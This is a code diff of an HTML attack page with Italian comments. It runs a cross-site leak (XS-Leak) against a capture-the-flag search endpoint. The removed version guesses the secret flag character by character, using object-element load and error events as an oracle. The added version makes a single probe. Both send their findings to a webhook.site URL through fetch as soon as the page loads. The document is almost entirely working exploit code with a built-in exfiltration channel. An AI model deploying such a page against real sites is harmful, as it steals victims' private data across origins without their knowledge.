@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XS-Leak Flag Extraction</title>
+    <title>XS-Leak Test</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,86 +16,67 @@
     </style>
 </head>
 <body>
-    <h1>XS-Leak Flag Extraction</h1>
+    <h1>XS-Leak Test</h1>
     <div id="result">In attesa di risultati...</div>
 
     <script>
-        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/"; // Caratteri possibili
-
-        // Funzione per testare l'accessibilità di una risorsa
-        const leak = (url) => {
+        const leak = async (url) => {
             return new Promise((resolve) => {
-                const s = document.createElement('object');
+                let s = document.createElement('object');
                 s.data = url;
-
-                s.onload = () => { 
-                    s.remove();
-                    resolve(true); // Risorsa accessibile (status 200)
+                s.onload = (e) => {
+                    e.target.remove();
+                    return resolve(0); // Risorsa accessibile
                 };
-                s.onerror = () => { 
-                    s.remove(); 
-                    resolve(false); // Risorsa non accessibile (status 404 o errore)
+                s.onerror = (e) => {
+                    e.target.remove();
+                    return resolve(1); // Risorsa non accessibile
                 };
-
                 document.body.appendChild(s);
             });
         };
 
-        // Funzione per cercare la flag carattere per carattere
-        const findFlag = async () => {
-            let flag = "flag{";
+        // Funzione da chiamare al caricamento della pagina
+        const testResourceLeak = async () => {
+            const url = 'https://matrix.capturetheflags.site/search?s=flag{'; // Sostituisci con l'URL da testare
+            const result = await leak(url);
             const resultDiv = document.getElementById('result');
 
-            while (!flag.endsWith("}")) {
-                let found = false; // Variabile per tracciare se un carattere è stato trovato
-
-                for (const char of charset) {
-                    const testFlag = `${flag}${char}`; // Prova con il carattere attuale
-                    const url = `https://matrix.capturetheflags.site/search?s=${testFlag}`; 
-                    const accessible = await leak(url); // Controlla l'accessibilità
-
-                    if (accessible) { // Se la risorsa è accessibile
-                        flag += char; // Aggiungi il carattere alla flag
-                        resultDiv.textContent = `Flag trovata finora: ${flag}`; // Mostra l'attuale flag parziale
-                        await logResult(`Flag parziale: ${flag}`); // Log del progresso
-                        found = true; // Imposta che è stato trovato un carattere
-                        break; // Esci dal ciclo per passare al prossimo carattere
-                    }
-                }
-
-                if (!found) {
-                    console.log('Nessun carattere trovato. Possibile terminazione della ricerca.'); // Messaggio di avviso
-                    break; // Interrompe il ciclo se non viene trovato alcun carattere
-                }
-            }
-
-            if (flag.endsWith("}")) {
-                resultDiv.textContent = `Flag completa trovata: ${flag}`; // Mostra la flag finale
-                await logResult(`Flag completa trovata: ${flag}`); // Log della flag completa
+            let message;
+            if (result === 0) {
+                resultDiv.textContent = 'Risorsa accessibile (status 200)';
+                message = 'Risorsa accessibile';
             } else {
-                resultDiv.textContent = 'La ricerca della flag è stata interrotta. Verifica il server.'; // Messaggio di errore
+                resultDiv.textContent = 'Risorsa non accessibile (status 404 o errore)';
+                message = 'Risorsa non accessibile';
             }
+
+            // Invia il log al server Webhook utilizzando GET
+            await logResult(message);
         };
 
-        // Funzione per inviare il log al Webhook
+        // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL per il logging
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
             try {
-                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`; // Parametrizza il messaggio
-                const response = await fetch(urlWithParams, { method: 'GET' }); // Invia il log
+                // Costruisci l'URL con il messaggio come parametro
+                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
+                const response = await fetch(urlWithParams, {
+                    method: 'GET', // Cambiato a GET
+                });
 
                 if (!response.ok) {
-                    console.error('Errore durante l\'invio del log:', response.statusText); // Gestione degli errori
+                    console.error('Errore durante l\'invio del log:', response.statusText);
                 } else {
-                    console.log('Log inviato con successo:', message); // Log del messaggio inviato
+                    console.log('Log inviato con successo');
                 }
             } catch (error) {
-                console.error('Errore di rete:', error); // Gestione degli errori di rete
+                console.error('Errore di rete:', error);
             }
         };
 
         // Esegui il test al caricamento del DOM
-        document.addEventListener('DOMContentLoaded', findFlag);
+        document.addEventListener('DOMContentLoaded', testResourceLeak);
     </script>
 </body>
 </html>
